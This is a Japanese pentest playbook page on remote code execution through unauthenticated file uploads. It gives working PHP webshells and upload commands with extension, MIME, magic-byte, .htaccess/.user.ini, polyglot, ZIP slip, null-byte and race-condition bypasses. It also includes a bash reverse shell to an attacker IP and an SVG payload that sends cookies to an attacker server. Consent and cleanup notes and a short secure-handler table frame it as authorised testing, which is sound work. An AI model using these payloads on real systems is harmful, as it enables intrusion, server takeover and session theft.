# 未認証ファイルアップロードによる RCE

> **スコープ**: Web アプリのファイルアップロード機能悪用による webshell 設置と RCE。基本アップロード〜バイパス手法（filename traversal / .htaccess / ポリグロット / SVG XSS / ZIP slip / null byte / TOCTOU）〜PoC 信頼性確認まで扱う。シェル取得後の安定化は `../../03_Post_Access_Linux/Shell_Stabilization.md` を参照。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 不可逆な変更を含む（アップロードファイルが残存する）
> - [x] 業務停止リスク（`.htaccess` / `.user.ini` の上書きは同ディレクトリの挙動を変える / webshell 放置でピボット起点になる）
> - [ ] 持続化に該当
> - [ ] SIEM/EDR で確実に検知される
>
> 実施可否は事前合意で明示確認すること。**`.htaccess` / `.user.ini` を書き換えた場合は原状回復必須**（元の内容を保存してから書き換える）。演習環境（HTB / OSCP 等）では制約なし。

## 着火条件

- Web アプリにファイルアップロード機能がある
- **認証チェックがサーバー側で行われていない**（セッション不要でアップロードエンドポイントに直接 POST できる）
- アップロードしたファイルに Web からアクセスできる（アップロードディレクトリが公開されている）
- サーバーがスクリプト言語（PHP・ASP.NET・JSP 等）を実行できる

> **着火シグナル:** アプリ名とバージョンが判明した時点で searchsploit に「unauthenticated file upload」ヒットがあれば即検討。ソースコードが入手できる場合は `upload.php` 等のアップロードハンドラを直接読んで認証チェックの有無を確認する。

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `curl`（ペネトレ用 Linux ディストリ標準）/ `python3`（標準搭載）/ `nc`（リバースシェル受信）
- オフライン代替: `curl` は全環境で使用可。`python3 requests` が必要な場合は `pip install requests --break-system-packages`

## 先に確認すること

- アップロードエンドポイントの URL（例: `/upload.php` / `/api/upload`）を特定する
- アップロードしたファイルが保存・公開されるパスを特定する（例: `/upload/` / `/files/`）
- サーバーがどのスクリプト言語を実行するか確認する（レスポンスヘッダー・nmap バナー）

**バイパス手法の早見表:**

| バイパス手法 | 概要 | 使う場面 |
|------------|------|---------|
| 二重拡張子 | `shell.php.png` として送信 → `.php` として実行 | 末尾拡張子のみチェックしているとき |
| マジックバイト前置 | PNG マジックバイト（`\x89\x50\x4e\x47...`）をファイル先頭に追加 | 先頭バイトで種別判定しているとき |
| Content-Type 偽装 | `Content-Type: image/png` を指定しながら PHP コードを送信 | MIME タイプのみチェックしているとき |
| 拡張子リスト外 | `.php5` / `.phtml` / `.asp` / `.aspx` を試す | 特定拡張子のみブラックリストで弾くとき |

**攻撃者の思考トレース:** まず直球（§1）で試し、弾かれたらバイパス手法（§2〜§7）を組み合わせる。「拡張子ブラックリスト + アップロードディレクトリが公開」という 2 条件が揃えば、ほぼ必ず何かのバイパスが効く。

---

## 1. 基本的な webshell アップロード〜RCE

**事前準備（必須）:**

```bash
# [Attacker] リスナー起動（別ターミナル）
nc -lnvp 4444
```

**コマンド:**

```bash
# [Attacker] PHP webshell を作成
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php

# [Attacker] 二重拡張子 + Content-Type 偽装でアップロード
curl -s -X POST "http://[TARGET]/upload.php?id=test" \
  -F "file=@shell.php;filename=shell.php.png;type=image/png" \
  -F "pupload=upload"

# [Attacker] アップロード先で動作確認
curl "http://[TARGET]/upload/test.php?cmd=whoami"
# → [HOSTNAME]\[USER] のような出力が返れば webshell 動作確認完了

# [Attacker] Linux: bash リバースシェルを URL エンコードして実行
curl "http://[TARGET]/upload/shell.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/[ATTACKER_IP]/4444+0%3E%261%27"
```

**Python による PNG マジックバイト前置アップロード（curl でバイパスできない場合）:**

```python
# [Attacker] ファイル: upload_shell.py
import requests
url = "http://[TARGET]/upload.php?id=test"
s = requests.Session()
s.get(url, verify=False)
PNG_magic = b'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a'
payload_code = b'<?php echo shell_exec($_GET["cmd"]); ?>'
png = {'file': ('test.php.png', PNG_magic + b'\n' + payload_code, 'image/png', {'Content-Disposition': 'form-data'})}
data = {'pupload': 'upload'}
r = s.post(url=url, files=png, data=data, verify=False)
print(r.status_code, r.text[:200])
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `whoami` でユーザー名が返る | webshell 動作確認完了 | リバースシェルへ昇格 |
| アップロードは成功するがスクリプトとして実行されない | アップロードディレクトリがスクリプト実行禁止 | 別ディレクトリを探す / §3 .htaccess 上書きへ |
| 拡張子が弾かれる | ホワイトリスト制御 | `.php5` / `.phtml` / `.asp` 等を試す |

**注意（原状回復）:** テスト完了後にアップロードした webshell を削除する。`curl "http://[TARGET]/upload/"` でファイル一覧を確認 → 手動削除または DELETE リクエスト。`shell_exec` が無効なら `system()` / `passthru()` / `exec()` を代替に試す。

---

## 2. filename パラメータでのパストラバーサル

multipart の `filename=` フィールドにパストラバーサルを混ぜると、`dirname/basename` のみ切り出していない実装で**指定先に直接書き込める**ことがある。アップロードディレクトリが非公開（実行不可）でも、公開ディレクトリに `.php` を置けば実行に持ち込める。

**コマンド:**

```bash
# [Attacker] filename にパストラバーサルを仕込む
curl -F 'file=@shell.php;filename=../../../var/www/html/shell.php' http://[TARGET]/upload

# 試す保存先候補
# ../../../var/www/html/shell.php     # Apache / Nginx 公開ルート
# ../../public/uploads/shell.php      # Web 公開直下
# ../templates/shell.php              # CMS テンプレート（読込時に実行）
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| アップロード後 `/shell.php?cmd=id` で実行できる | filename traversal 成立 | §1 のリバースシェルへ |
| 400 / エラー | サーバー側でパスを検証 | §3 .htaccess 上書きへ |

**注意（原状回復）:** 書き込んだ webshell をテスト完了後に削除する（`curl -X DELETE` または WebShell 経由で `rm`）。

---

## 3. `.htaccess` / `.user.ini` 自体のアップロード

拡張子ブラックリストが堅くて `.php` / `.phtml` / `.php5` が全て弾かれる環境では、**サーバー設定ファイル自体を上げて画像ディレクトリで PHP 実行を許可させる**経路がある。

**コマンド:**

```bash
# [Attacker] .htaccess を upload/ に置いて PHP 実行を許可させる
cat > .htaccess << 'EOF'
AddType application/x-httpd-php .png .jpg .gif
EOF
curl -F 'file=@.htaccess;filename=.htaccess' http://[TARGET]/upload

# [Attacker] .user.ini（PHP 5.3+）— auto_prepend_file で強制 include
cat > .user.ini << 'EOF'
auto_prepend_file = "shell.png"
EOF
curl -F 'file=@.user.ini;filename=.user.ini' http://[TARGET]/upload

# [Attacker] その後 shell.png（中身は PHP）をアップロード
echo '<?php system($_GET["cmd"]); ?>' > shell.png
curl -F 'file=@shell.png' http://[TARGET]/upload
# /upload/shell.png にアクセス → PHP として実行
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `/upload/shell.png?cmd=id` でコマンドが実行される | .htaccess / .user.ini 経由の PHP 実行 | §1 のリバースシェルへ |
| .htaccess が弾かれる | .htaccess のアップロードを拒否 | .user.ini を試す |

**注意（原状回復）:** `.htaccess` / `.user.ini` を書き換えた場合は**元の内容を保存してから書き換え**、テスト完了後に必ず元に戻す。同ディレクトリの他ファイルの挙動が変わる高影響操作。

---

## 4. ポリグロット（画像 + スクリプト）

Content-Type / マジックバイト判定（`getimagesize()` 等）を通過させるために、画像として valid な先頭 + スクリプト本体を連結する。

**コマンド:**

```bash
# [Attacker] GIF マジックバイト + PHP
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>\n' > shell.gif
# getimagesize() は GIF として認識・ファイル拡張子が .php で保存されれば PHP として実行

# [Attacker] 実存 PNG ファイル末尾に PHP を追記
cp legit.png poly.png
echo '<?php system($_GET["cmd"]); ?>' >> poly.png
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 画像として受け入れられて PHP として実行される | ポリグロット成立 | §1 のリバースシェルへ |
| 画像 check は通るが PHP として実行されない | アップロードディレクトリがスクリプト実行禁止 | §2 filename traversal / §3 .htaccess へ |

---

## 5. SVG 内 JavaScript（保存型 XSS への昇格）

SVG は XML で `<script>` タグや `onload` 属性を持てる。**画像扱いで受け入れられがちなのに XSS のキャリアになる。**

**コマンド（SVG ペイロード）:**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://[ATTACKER_HTTP_SERVER]/c?'+document.cookie)">
  <script type="text/javascript">
    fetch('http://[ATTACKER_HTTP_SERVER]/c?'+document.cookie);
  </script>
</svg>
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| アップロード後 URL を直接ブラウザで開くと XSS 発火 | SVG が Content-Type `image/svg+xml` で直接表示される経路 | セッション窃取 → `XSS.md` |
| `<img src="...">` 経由のレンダリングのみ | スクリプト実行不可（サンドボックス）| SVG の XSS 成立は難しい |

**注意:** アップロード後の URL が `<img>` ではなく**直接ブラウザで表示される経路**（プレビュー / Content-Type `image/svg+xml`）なら XSS 成立。

---

## 6. ZIP slip（アーカイブ展開系アップロード）

ZIP / TAR / RAR を受け取って展開するアップローダで、エントリ名に `../` を含めると展開先の外に書き出せる。

**コマンド:**

```bash
# [Attacker] ZIP slip ペイロード（python で生 ZIP を組み立て）
mkdir -p tmpzip && cd tmpzip
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -c "
import zipfile
with zipfile.ZipFile('../slip.zip', 'w') as z:
    z.writestr('../../../var/www/html/shell.php', open('shell.php').read())
"
# slip.zip をアップロード → サーバー側展開で /var/www/html/shell.php が出現
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `/shell.php?cmd=id` で実行できる | ZIP slip 成立 | §1 のリバースシェルへ |
| エントリパスを検証されて拒否 | サーバー側の ZIP slip 対策あり | §1〜§5 の別バイパスへ |

**注意（原状回復）:** 書き込んだ webshell を削除する。展開先の確認: `curl "http://[TARGET]/shell.php"` で 404 なら書き込まれていない。

---

## 7. null byte / TOCTOU（古典・特殊環境向け）

**null byte 埋め込み（PHP 5.3.x 以下 / 古い CGI 向け）:**

```bash
# [Attacker] `shell.php%00.png` を `shell.php` として保存しつつ拡張子チェックは `.png` を見る実装ミス
curl -F 'file=@shell.php;filename=shell.php%00.png' http://[TARGET]/upload
```

**TOCTOU レース（一時ファイルに先にアクセス）:**

```bash
# [Attacker] アップロードと並行に大量リクエストを撃つ
( curl -F 'file=@shell.php' http://[TARGET]/upload & )
for i in $(seq 1 10000); do
  curl -s "http://[TARGET]/tmp/[PREDICTABLE_TEMP_NAME]?cmd=id" &
done; wait
```

**観測される出力 → 次のアクション:**

| 手法 | 成立条件 | 次のアクション |
|---|---|---|
| null byte | PHP 5.3.4 未満 / Java 7 未満 / 古い C 拡張 | 成立したら §1 の webshell 手順へ |
| TOCTOU | 一時ファイル名が予測可能 + 一時保存が Web 公開ディレクトリ配下 + 検証に時間がかかる | 3 条件揃っていれば成立する可能性がある |

**注意:** null byte は現代環境（PHP 5.3.4+）ではほぼ閉じている。TOCTOU は一時ファイル名の予測可能性に依存する。

---

## 8. PoC の信頼性確認と事前検証

**コマンド:**

```bash
# [Attacker] PoC の詳細を確認（コードを作業フォルダにコピーする前に読む）
searchsploit -x [PATH_FROM_RESULTS]
```

**アップロードハンドラで確認すべき観点（ソース入手時）:**

| 確認する観点 | セキュアな実装 | 脆弱な実装（着火条件）|
|------------|-------------|-------------------|
| セッション確認 | `session_start(); if (!isset($_SESSION['user'])) { die(); }` | セッション確認なし |
| ファイルタイプ確認 | ホワイトリストで MIME を検証 | MIME タイプをクライアント入力のまま信用 |
| 拡張子確認 | ホワイトリスト + 末尾拡張子のみ | ブラックリストのみ |
| 保存先 | Web 非公開ディレクトリ + ランダムファイル名 | `upload/` 等の公開パス + 元ファイル名そのまま |

---

## 刺さらなかったとき（全体）

| 症状 | 原因の推定 | 次のアクション |
|------|----------|--------------|
| アップロードは成功するがスクリプトとして実行されない | アップロードディレクトリがスクリプト実行禁止 | 別のアップロードディレクトリを探す / §3 .htaccess 上書きを試みる |
| 403 / 401 が返る | 認証チェックが存在する | 認証済みセッションの Cookie をヘッダーに付けて再送 |
| 拡張子が弾かれる（エラーメッセージあり） | ホワイトリスト制御 | §4 ポリグロット / §3 .htaccess / §2 filename traversal へ |
| アップロード後のパスが不明 | 保存先が非公開ディレクトリ | レスポンス本文・ソースコード・ディレクトリ列挙でパスを確認 |

---

## 注意点・落とし穴

- **ファイルの残存（原状回復）:** テスト完了後に webshell を削除する。`curl "http://[TARGET]/upload/"` でファイル一覧を確認
- PHP の `shell_exec` が無効なら `system()` / `passthru()` / `exec()` を代替に試す
- Content-Type の偽装だけでは通らない場合はマジックバイトの前置を組み合わせる
- Windows で `nc.exe -e` を使う場合は `-e` 対応ビルド（`ncat.exe` または "-gaping security hole" 版）が必要

> **個別ブロック固有の注意は各 §N の「注意:」を参照。**

---

## 本番での前提

- **事前合意の要否**: ★★（ファイルアップロード機能の悪用は事前合意で範囲明示が必要）
- **業務影響リスク**: アップロードファイルが残存 / `.htaccess` 書き換えで同ディレクトリの挙動変化
- **原状回復必須項目**: ✅ アップロードした webshell ファイルを削除する / ✅ .htaccess / .user.ini を元の内容に戻す
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：Web アプリのフレームワーク・アプリ名の特定 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：searchsploit で「unauthenticated file upload」を確認 → `../../05_Tools_Reference/Searchsploit.md`
- 後：webshell からリバースシェルへの昇格 → `Command_Injection.md`（リバースシェル配信セクション）
- 後：Windows で初期シェル取得後の列挙 → `../../04_Post_Access_Windows_AD/Enumeration_Checklist.md`
- 関連：SVG 経由 XSS の詳細 → `XSS.md`
- 関連：シェル取得後の安定化 → `../../03_Post_Access_Linux/Shell_Stabilization.md`
